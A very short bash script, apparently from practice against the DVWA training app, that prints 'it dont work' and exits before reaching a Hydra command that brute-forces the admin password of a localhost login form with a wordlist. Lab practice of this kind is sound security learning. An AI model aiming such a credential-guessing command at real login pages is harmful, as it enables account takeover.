#!/usr/bin/env bash

echo "it dont work"
exit 1

hydra -l admin -P /usr/share/dirb/wordlists/small.txt localhost http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V